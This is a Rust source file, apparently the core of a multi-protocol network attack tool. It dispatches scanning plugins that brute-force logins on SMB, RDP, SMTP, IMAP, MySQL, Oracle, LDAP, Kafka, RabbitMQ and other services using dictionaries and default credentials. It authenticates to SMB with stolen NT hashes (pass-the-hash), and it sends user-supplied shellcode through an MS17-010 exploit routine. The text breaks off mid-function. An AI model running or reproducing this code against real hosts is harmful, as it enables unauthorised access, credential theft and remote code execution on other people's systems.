use aes::Aes128;
use anyhow::{Context, Result};
use base64::Engine;
use cbc::Decryptor as Aes128CbcDecryptor;
use cbc::cipher::{BlockDecryptMut, KeyIvInit, block_padding::Pkcs7};
use oracle_rs::{Config as OracleConfig, Connection as OracleConnection};
use rdp::core::client::Connector as RdpConnector;
use reqwest::blocking::Client;
use serde_json::{Value, json};
use sha1::{Digest, Sha1};
use smb2::{ClientConfig as Smb2ClientConfig, SmbClient as Smb2Client};
use std::collections::{BTreeMap, BTreeSet};
use std::convert::TryInto;
use std::fs;
use std::io::{Read, Write};
use std::net::{Shutdown, TcpStream, ToSocketAddrs, UdpSocket};
use std::path::PathBuf;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::thread;
use std::time::{Duration, Instant};

type FindnetProbeResult = (String, Vec<String>, Vec<String>);

#[derive(Debug, Default, Clone, PartialEq, Eq)]
struct NetBiosInfo {
    computer_name: String,
    domain_name: String,
    netbios_domain: String,
    netbios_computer: String,
    workstation_service: String,
    server_service: String,
    domain_controllers: String,
    os_version: String,
    group_name: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OpenService {
    pub host: String,
    pub port: u16,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PluginContext {
    pub usernames: Vec<String>,
    pub passwords: Vec<String>,
    pub timeout_secs: u64,
    pub ssh_key_path: Option<PathBuf>,
}

mod connection;
mod credentials;
mod dictionaries;
mod exploit_assets;
mod protocol_assets;
mod protocols;
mod registry;
mod runtime;
use connection::{
    connect_stream, connect_tls_stream, read_available, read_available_bytes,
    read_available_bytes_io, read_line, read_line_io, tls_fallback_plaintext_probe_timeout,
    write_and_flush, write_and_flush_io,
};
use credentials::{passwords_for_user, usernames_for_service};
use dictionaries::{
    DEFAULT_SNMP_COMMUNITIES, ORACLE_COMMON_SERVICE_NAMES, ORACLE_HIGH_RISK_CREDENTIALS,
};
use exploit_assets::*;
use protocol_assets::*;
pub use runtime::{
    AuthRuntimeOptions, ConnectionRuntimeOptions, Ms17010RuntimeOptions, RedisRuntimeOptions,
    ServiceRuntimeBundle, ServiceScanRuntimeOptions, set_auth_runtime_options,
    set_connection_runtime_options, set_ms17010_runtime_options, set_redis_runtime_options,
    set_service_scan_runtime_options,
};
use runtime::{
    brute_force_disabled, current_auth_runtime_options, current_ms17010_runtime_options,
};

#[derive(Debug, Clone, PartialEq)]
pub struct PluginFinding {
    pub plugin: String,
    pub target: OpenService,
    pub status: String,
    pub details: BTreeMap<String, Value>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PluginDefinition {
    pub key: &'static str,
    pub name: &'static str,
    pub ports: &'static [u16],
    pub transport: Transport,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Smb2AuthMode {
    Password,
    Hash,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Transport {
    Tcp,
    Udp,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ServiceScanTask {
    plugin_key: &'static str,
    target: OpenService,
}

pub fn registered_plugins() -> Vec<PluginDefinition> {
    registry::REGISTERED_PLUGINS.to_vec()
}
pub fn scan_services(
    targets: &[OpenService],
    mode: &str,
    context: &PluginContext,
    runtime: &ServiceRuntimeBundle,
) -> Result<Vec<PluginFinding>> {
    let selected = select_plugins(mode);
    let explicit_mode = !mode.eq_ignore_ascii_case("all");
    let tasks = build_service_scan_tasks(targets, &selected, explicit_mode);

    execute_service_scan_tasks(tasks, runtime, |task, runtime| {
        scan_service_task(task, context, runtime)
    })
}

fn build_service_scan_tasks(
    targets: &[OpenService],
    selected: &[PluginDefinition],
    explicit_mode: bool,
) -> Vec<ServiceScanTask> {
    let mut tasks = Vec::new();
    for target in targets {
        for plugin in selected {
            if !explicit_mode && !plugin.ports.contains(&target.port) {
                continue;
            }
            tasks.push(ServiceScanTask {
                plugin_key: plugin.key,
                target: target.clone(),
            });
        }
    }
    tasks
}

/// Install runtime options for leaf helpers that still read thread-local state.
/// Called per-task from an explicitly passed bundle (not as a post-spawn side effect).
fn install_runtime_for_task(runtime: &ServiceRuntimeBundle) {
    set_auth_runtime_options(runtime.auth.clone());
    set_redis_runtime_options(runtime.redis.clone());
    set_ms17010_runtime_options(runtime.ms17010.clone());
    set_connection_runtime_options(runtime.connection.clone());
    set_service_scan_runtime_options(runtime.service.clone());
}

fn execute_service_scan_tasks<F>(
    tasks: Vec<ServiceScanTask>,
    runtime: &ServiceRuntimeBundle,
    scan_task: F,
) -> Result<Vec<PluginFinding>>
where
    F: Fn(&ServiceScanTask, &ServiceRuntimeBundle) -> Result<Option<PluginFinding>> + Sync,
{
    if tasks.is_empty() {
        return Ok(Vec::new());
    }

    let worker_count = usize::from(runtime.service.module_threads.max(1)).min(tasks.len());
    let deadline = Some(Instant::now() + Duration::from_secs(runtime.service.global_timeout_secs));
    let next_index = AtomicUsize::new(0);
    let total = tasks.len();
    let log_errors = runtime.service.log_errors;

    let (mut findings, mut errors) = thread::scope(|scope| {
        let mut workers = Vec::with_capacity(worker_count);
        for _ in 0..worker_count {
            let next_index = &next_index;
            let tasks = &tasks;
            let scan_task = &scan_task;

            workers.push(scope.spawn(move || {
                let mut local_findings = Vec::new();
                let mut local_errors = Vec::new();
                loop {
                    if let Some(deadline) = deadline
                        && Instant::now() >= deadline
                    {
                        break;
                    }

                    let index = next_index.fetch_add(1, Ordering::Relaxed);
                    if index >= total {
                        break;
                    }
                    let task = &tasks[index];

                    match scan_task(task, runtime) {
                        Ok(Some(finding)) => local_findings.push(finding),
                        Ok(None) => {}
                        Err(scan_error) => local_errors.push(format!(
                            "scan error {}:{} [{}] - {scan_error}",
                            task.target.host, task.target.port, task.plugin_key
                        )),
                    }
                }
                (local_findings, local_errors)
            }));
        }

        let mut findings = Vec::new();
        let mut errors = Vec::new();
        for worker in workers {
            let (mut worker_findings, mut worker_errors) =
                worker.join().expect("service scan worker panicked");
            findings.append(&mut worker_findings);
            errors.append(&mut worker_errors);
        }
        (findings, errors)
    });

    if log_errors {
        errors.sort();
        for scan_error in errors {
            eprintln!("{scan_error}");
        }
    }
    sort_plugin_findings(&mut findings);

    Ok(findings)
}

fn sort_plugin_findings(findings: &mut [PluginFinding]) {
    findings.sort_by(|left, right| {
        left.target
            .host
            .cmp(&right.target.host)
            .then_with(|| left.target.port.cmp(&right.target.port))
            .then_with(|| left.plugin.cmp(&right.plugin))
            .then_with(|| left.status.cmp(&right.status))
    });
}

fn scan_service_task(
    task: &ServiceScanTask,
    context: &PluginContext,
    runtime: &ServiceRuntimeBundle,
) -> Result<Option<PluginFinding>> {
    // Explicit runtime is installed once per task for deep helpers (connect retries, etc.).
    install_runtime_for_task(runtime);
    let target = &task.target;
    match task.plugin_key {
        "ftp" => protocols::ftp::scan_ftp(target, context),
        "ssh" => protocols::ssh::scan_ssh(target, context),
        "smb" => scan_smb(target, context),
        "smb2" => scan_smb2(target, context),
        "telnet" => protocols::telnet::scan_telnet(target, context),
        "rdp" => scan_rdp(target, context),
        "findnet" => scan_findnet(target, context.timeout_secs),
        "netbios" => scan_netbios(target, context.timeout_secs),
        "smtp" => scan_smtp(target, context),
        "imap" => scan_imap(target, context),
        "pop3" => scan_pop3(target, context),
        "activemq" => scan_activemq(target, context),
        "rsync" => scan_rsync(target, context),
        "rabbitmq" => scan_rabbitmq(target, context),
        "mongodb" => protocols::mongodb::scan_mongodb(target),
        "modbus" => protocols::modbus::scan_modbus(target, context.timeout_secs),
        "ldap" => scan_ldap(target, context),
        "vnc" => protocols::vnc::scan_vnc(target, context),
        "ms17010" => scan_ms17010(target, context.timeout_secs),
        "smbghost" => protocols::smbghost::scan_smbghost(target, context.timeout_secs),
        "kafka" => scan_kafka(target, context),
        "mysql" => scan_mysql(target, context),
        "postgres" => protocols::postgres::scan_postgres(target, context),
        "neo4j" => protocols::neo4j::scan_neo4j(target, context),
        "cassandra" => protocols::cassandra::scan_cassandra(target, context),
        "snmp" => scan_snmp(target, context.timeout_secs),
        "redis" => protocols::redis::scan_redis(target, context),
        "memcached" => protocols::memcached::scan_memcached(target, context),
        "elasticsearch" => protocols::elasticsearch::scan_elasticsearch(target, context),
        "mssql" => scan_mssql(target, context),
        "oracle" => scan_oracle(target, context),
        _ => Ok(None),
    }
}

pub fn select_plugins(mode: &str) -> Vec<PluginDefinition> {
    let mode = mode.to_ascii_lowercase();
    if mode == "all" {
        registry::REGISTERED_PLUGINS.to_vec()
    } else {
        registry::REGISTERED_PLUGINS
            .iter()
            .filter(|plugin| plugin.key == mode)
            .cloned()
            .collect()
    }
}

fn scan_smb(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    scan_smb_with(target, context, smb_login)
}

fn scan_smb2(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    scan_smb2_with(target, context, smb2_login)
}

fn scan_smb_with<F>(
    target: &OpenService,
    context: &PluginContext,
    mut login: F,
) -> Result<Option<PluginFinding>>
where
    F: FnMut(&OpenService, &str, &str, &str, u64) -> Result<bool>,
{
    let runtime = current_auth_runtime_options();
    let domain = runtime.domain.unwrap_or_default();
    for username in usernames_for_service("smb", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if login(target, &username, &password, &domain, context.timeout_secs)? {
                let mut details = BTreeMap::from([
                    ("service".to_string(), json!("smb")),
                    ("port".to_string(), json!(target.port)),
                    ("type".to_string(), json!("weak-password")),
                    ("username".to_string(), json!(username)),
                    ("password".to_string(), json!(password)),
                ]);
                if !domain.is_empty() {
                    details.insert("domain".to_string(), json!(domain));
                }
                return Ok(Some(PluginFinding {
                    plugin: "smb".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details,
                }));
            }
        }
    }

    Ok(None)
}

fn scan_smb2_with<F>(
    target: &OpenService,
    context: &PluginContext,
    mut login: F,
) -> Result<Option<PluginFinding>>
where
    F: FnMut(&OpenService, &str, &str, &str, Smb2AuthMode, u64) -> Result<Option<Vec<String>>>,
{
    let runtime = current_auth_runtime_options();
    let domain = runtime.domain.unwrap_or_default();
    let usernames = usernames_for_service("smb2", context);
    if !runtime.hashes.is_empty() {
        for username in usernames {
            for hash in &runtime.hashes {
                if let Some(shares) = login(
                    target,
                    &username,
                    hash,
                    &domain,
                    Smb2AuthMode::Hash,
                    context.timeout_secs,
                )? {
                    return Ok(Some(build_smb2_finding(
                        target,
                        &username,
                        hash,
                        &domain,
                        Smb2AuthMode::Hash,
                        shares,
                    )));
                }
            }
        }
        return Ok(None);
    }

    for username in usernames {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if let Some(shares) = login(
                target,
                &username,
                &password,
                &domain,
                Smb2AuthMode::Password,
                context.timeout_secs,
            )? {
                return Ok(Some(build_smb2_finding(
                    target,
                    &username,
                    &password,
                    &domain,
                    Smb2AuthMode::Password,
                    shares,
                )));
            }
        }
    }

    Ok(None)
}

fn scan_rdp(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    scan_rdp_with(target, context, rdp_login)
}

fn scan_rdp_with<F>(
    target: &OpenService,
    context: &PluginContext,
    mut login: F,
) -> Result<Option<PluginFinding>>
where
    F: FnMut(&OpenService, &str, &str, &str, u64) -> Result<bool>,
{
    let runtime = current_auth_runtime_options();
    let domain = runtime.domain.unwrap_or_default();
    for username in usernames_for_service("rdp", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if login(target, &username, &password, &domain, context.timeout_secs)? {
                let mut details = BTreeMap::from([
                    ("service".to_string(), json!("rdp")),
                    ("port".to_string(), json!(target.port)),
                    ("type".to_string(), json!("weak-password")),
                    ("username".to_string(), json!(username)),
                    ("password".to_string(), json!(password)),
                ]);
                if !domain.is_empty() {
                    details.insert("domain".to_string(), json!(domain));
                }
                return Ok(Some(PluginFinding {
                    plugin: "rdp".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details,
                }));
            }
        }
    }

    Ok(None)
}

fn scan_smtp(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if smtp_login(target, "", "", context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "smtp".to_string(),
            target: target.clone(),
            status: "anonymous-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("smtp")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("anonymous-access")),
                ("anonymous".to_string(), json!(true)),
            ]),
        }));
    }

    for username in usernames_for_service("smtp", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if smtp_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "smtp".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("smtp")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_imap(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    for username in usernames_for_service("imap", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if imap_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "imap".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("imap")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_pop3(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    for username in usernames_for_service("pop3", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            let (authenticated, tls) =
                pop3_login(target, &username, &password, context.timeout_secs)?;
            if authenticated {
                return Ok(Some(PluginFinding {
                    plugin: "pop3".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("pop3")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                        ("tls".to_string(), json!(tls)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_activemq(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if activemq_login(target, "admin", "admin", context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "activemq".to_string(),
            target: target.clone(),
            status: "weak-password".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("activemq")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("weak-password")),
                ("username".to_string(), json!("admin")),
                ("password".to_string(), json!("admin")),
            ]),
        }));
    }

    for username in usernames_for_service("activemq", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if username == "admin" && password == "admin" {
                continue;
            }
            if activemq_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "activemq".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("activemq")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_rsync(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if let Some(module) = rsync_login(target, None, None, context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "rsync".to_string(),
            target: target.clone(),
            status: "anonymous-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("rsync")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("anonymous-access")),
                ("module".to_string(), json!(module)),
            ]),
        }));
    }

    for username in usernames_for_service("rsync", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if let Some(module) = rsync_login(
                target,
                Some(username.as_str()),
                Some(password.as_str()),
                context.timeout_secs,
            )? {
                return Ok(Some(PluginFinding {
                    plugin: "rsync".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("rsync")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("module".to_string(), json!(module)),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_rabbitmq(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if rabbitmq_login(target, "guest", "guest", context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "rabbitmq".to_string(),
            target: target.clone(),
            status: "weak-password".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("rabbitmq")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("weak-password")),
                ("username".to_string(), json!("guest")),
                ("password".to_string(), json!("guest")),
            ]),
        }));
    }

    for username in usernames_for_service("rabbitmq", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if username == "guest" && password == "guest" {
                continue;
            }
            if rabbitmq_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "rabbitmq".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("rabbitmq")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_ldap(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if ldap_bind_and_search(target, "", "", context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "ldap".to_string(),
            target: target.clone(),
            status: "anonymous-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("ldap")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("anonymous-access")),
            ]),
        }));
    }

    for username in usernames_for_service("ldap", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if ldap_bind_and_search(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "ldap".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("ldap")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_findnet(target: &OpenService, timeout_secs: u64) -> Result<Option<PluginFinding>> {
    if let Some((hostname, ipv4, ipv6)) = findnet_probe(target, timeout_secs)? {
        let mut details = BTreeMap::new();
        if !hostname.is_empty() {
            details.insert("hostname".to_string(), json!(hostname));
        }
        if !ipv4.is_empty() {
            details.insert("ipv4".to_string(), json!(ipv4));
        }
        if !ipv6.is_empty() {
            details.insert("ipv6".to_string(), json!(ipv6));
        }
        return Ok(Some(PluginFinding {
            plugin: "findnet".to_string(),
            target: target.clone(),
            status: "identified".to_string(),
            details,
        }));
    }

    Ok(None)
}

fn scan_netbios(target: &OpenService, timeout_secs: u64) -> Result<Option<PluginFinding>> {
    if let Some(info) = netbios_probe(target, timeout_secs)? {
        let mut details = BTreeMap::from([("port".to_string(), json!(target.port))]);
        if !info.computer_name.is_empty() {
            details.insert("computer_name".to_string(), json!(info.computer_name));
        }
        if !info.domain_name.is_empty() {
            details.insert("domain_name".to_string(), json!(info.domain_name));
        }
        if !info.netbios_domain.is_empty() {
            details.insert("netbios_domain".to_string(), json!(info.netbios_domain));
        }
        if !info.netbios_computer.is_empty() {
            details.insert("netbios_computer".to_string(), json!(info.netbios_computer));
        }
        if !info.workstation_service.is_empty() {
            details.insert(
                "workstation_service".to_string(),
                json!(info.workstation_service),
            );
        }
        if !info.server_service.is_empty() {
            details.insert("server_service".to_string(), json!(info.server_service));
        }
        if !info.domain_controllers.is_empty() {
            details.insert(
                "domain_controllers".to_string(),
                json!(info.domain_controllers),
            );
        }
        if !info.os_version.is_empty() {
            details.insert("os_version".to_string(), json!(info.os_version));
        }
        return Ok(Some(PluginFinding {
            plugin: "netbios".to_string(),
            target: target.clone(),
            status: "identified".to_string(),
            details,
        }));
    }

    Ok(None)
}

fn scan_ms17010(target: &OpenService, timeout_secs: u64) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if let Some((os, backdoor)) = detect_ms17010(target, timeout_secs)? {
        let mut details = BTreeMap::from([
            ("service".to_string(), json!("smb")),
            ("port".to_string(), json!(target.port)),
            ("vulnerability".to_string(), json!("MS17-010")),
        ]);
        let runtime = current_ms17010_runtime_options();
        if !os.is_empty() {
            details.insert("os".to_string(), json!(os));
        }
        if backdoor {
            details.insert("backdoor".to_string(), json!("DOUBLEPULSAR"));
        }
        if let Some(shellcode) = runtime
            .shellcode
            .as_deref()
            .filter(|value| !value.trim().is_empty())
        {
            match exploit_ms17010(target, timeout_secs, shellcode) {
                Ok(()) => {
                    details.insert("exploit".to_string(), json!("payload-sent"));
                }
                Err(error) => {
                    details.insert("exploit".to_string(), json!("failed"));
                    details.insert("exploit_error".to_string(), json!(error.to_string()));
                }
            }
        }
        return Ok(Some(PluginFinding {
            plugin: "ms17010".to_string(),
            target: target.clone(),
            status: "vulnerable".to_string(),
            details,
        }));
    }

    Ok(None)
}

fn scan_kafka(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    if kafka_login(target, None, None, context.timeout_secs)? {
        return Ok(Some(PluginFinding {
            plugin: "kafka".to_string(),
            target: target.clone(),
            status: "unauthorized-access".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("kafka")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("unauthorized-access")),
            ]),
        }));
    }

    for username in usernames_for_service("kafka", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if kafka_login(
                target,
                Some(username.as_str()),
                Some(password.as_str()),
                context.timeout_secs,
            )? {
                return Ok(Some(PluginFinding {
                    plugin: "kafka".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("kafka")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_snmp(target: &OpenService, timeout_secs: u64) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    for community in DEFAULT_SNMP_COMMUNITIES {
        if let Some(system) = snmp_get_sysdescr(target, community, timeout_secs)? {
            return Ok(Some(PluginFinding {
                plugin: "snmp".to_string(),
                target: target.clone(),
                status: "weak-community".to_string(),
                details: BTreeMap::from([
                    ("service".to_string(), json!("snmp")),
                    ("port".to_string(), json!(target.port)),
                    ("type".to_string(), json!("weak-community")),
                    ("community".to_string(), json!(community)),
                    ("system".to_string(), json!(system)),
                ]),
            }));
        }
    }

    Ok(None)
}

fn scan_mssql(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    for username in usernames_for_service("mssql", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if mssql_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "mssql".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("mssql")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn scan_oracle(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    scan_oracle_with(target, context, oracle_login)
}

fn scan_oracle_with<F>(
    target: &OpenService,
    context: &PluginContext,
    mut login: F,
) -> Result<Option<PluginFinding>>
where
    F: FnMut(&OpenService, &str, &str, &str, u64) -> Result<bool>,
{
    let mut attempted = BTreeSet::new();

    for (username, password) in ORACLE_HIGH_RISK_CREDENTIALS {
        let username = (*username).to_string();
        let password = (*password).to_string();
        if !attempted.insert((username.clone(), password.clone())) {
            continue;
        }
        if let Some(finding) = oracle_attempt_service_names(
            target,
            &username,
            &password,
            context.timeout_secs,
            &mut login,
        )? {
            return Ok(Some(finding));
        }
    }

    for raw_username in usernames_for_service("oracle", context) {
        let username = raw_username.to_ascii_uppercase();
        for password in passwords_for_user(Some(raw_username.as_str()), context) {
            if !attempted.insert((username.clone(), password.clone())) {
                continue;
            }
            if let Some(finding) = oracle_attempt_service_names(
                target,
                &username,
                &password,
                context.timeout_secs,
                &mut login,
            )? {
                return Ok(Some(finding));
            }
        }
    }

    Ok(None)
}

fn oracle_attempt_service_names<F>(
    target: &OpenService,
    username: &str,
    password: &str,
    timeout_secs: u64,
    login: &mut F,
) -> Result<Option<PluginFinding>>
where
    F: FnMut(&OpenService, &str, &str, &str, u64) -> Result<bool>,
{
    for service_name in ORACLE_COMMON_SERVICE_NAMES {
        if login(target, username, password, service_name, timeout_secs)? {
            return Ok(Some(PluginFinding {
                plugin: "oracle".to_string(),
                target: target.clone(),
                status: "weak-password".to_string(),
                details: BTreeMap::from([
                    ("service".to_string(), json!("oracle")),
                    ("port".to_string(), json!(target.port)),
                    ("type".to_string(), json!("weak-password")),
                    ("username".to_string(), json!(username)),
                    ("password".to_string(), json!(password)),
                    ("service_name".to_string(), json!(service_name)),
                ]),
            }));
        }
    }

    Ok(None)
}

fn scan_mysql(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    if brute_force_disabled() {
        return Ok(None);
    }
    for username in usernames_for_service("mysql", context) {
        for password in passwords_for_user(Some(username.as_str()), context) {
            if mysql_login(target, &username, &password, context.timeout_secs)? {
                return Ok(Some(PluginFinding {
                    plugin: "mysql".to_string(),
                    target: target.clone(),
                    status: "weak-password".to_string(),
                    details: BTreeMap::from([
                        ("service".to_string(), json!("mysql")),
                        ("port".to_string(), json!(target.port)),
                        ("type".to_string(), json!("weak-password")),
                        ("username".to_string(), json!(username)),
                        ("password".to_string(), json!(password)),
                    ]),
                }));
            }
        }
    }

    Ok(None)
}

fn smb_login(
    target: &OpenService,
    username: &str,
    password: &str,
    domain: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .context("failed to build smb runtime")?;

    runtime.block_on(async {
        let client = Smb2Client::connect(Smb2ClientConfig {
            addr: format!("{}:{}", target.host, target.port),
            timeout,
            username: username.to_string(),
            password: password.to_string(),
            nt_hash: None,
            domain: domain.to_string(),
            auto_reconnect: false,
            compression: false,
            dfs_enabled: false,
            dfs_target_overrides: Default::default(),
        })
        .await;

        match client {
            Ok(_) => Ok(true),
            Err(_) => Ok(false),
        }
    })
}

fn smb2_login(
    target: &OpenService,
    username: &str,
    credential: &str,
    domain: &str,
    auth_mode: Smb2AuthMode,
    timeout_secs: u64,
) -> Result<Option<Vec<String>>> {
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let nt_hash = match auth_mode {
        Smb2AuthMode::Password => None,
        Smb2AuthMode::Hash => Some(
            hex::decode(credential)
                .with_context(|| format!("invalid smb2 hash for user {username}"))?,
        ),
    };
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .context("failed to build smb2 runtime")?;

    runtime.block_on(async {
        let client = Smb2Client::connect(Smb2ClientConfig {
            addr: format!("{}:{}", target.host, target.port),
            timeout,
            username: username.to_string(),
            password: credential.to_string(),
            nt_hash,
            domain: domain.to_string(),
            auto_reconnect: false,
            compression: false,
            dfs_enabled: false,
            dfs_target_overrides: Default::default(),
        })
        .await;

        match client {
            Ok(mut client) => match client.list_shares().await {
                Ok(shares) => Ok(Some(
                    shares
                        .into_iter()
                        .map(|share| share.name)
                        .collect::<Vec<_>>(),
                )),
                Err(_) => Ok(Some(Vec::new())),
            },
            Err(_) => Ok(None),
        }
    })
}

fn build_smb2_finding(
    target: &OpenService,
    username: &str,
    credential: &str,
    domain: &str,
    auth_mode: Smb2AuthMode,
    shares: Vec<String>,
) -> PluginFinding {
    let mut details = BTreeMap::from([
        ("service".to_string(), json!("smb2")),
        ("port".to_string(), json!(target.port)),
        ("type".to_string(), json!("weak-auth")),
        ("username".to_string(), json!(username)),
        ("credential".to_string(), json!(credential)),
        (
            "auth_type".to_string(),
            json!(match auth_mode {
                Smb2AuthMode::Password => "password",
                Smb2AuthMode::Hash => "hash",
            }),
        ),
    ]);
    if !domain.is_empty() {
        details.insert("domain".to_string(), json!(domain));
    }
    if !shares.is_empty() {
        details.insert("shares".to_string(), json!(shares));
    }
    PluginFinding {
        plugin: "smb2".to_string(),
        target: target.clone(),
        status: "weak-auth".to_string(),
        details,
    }
}

fn rdp_login(
    target: &OpenService,
    username: &str,
    password: &str,
    domain: &str,
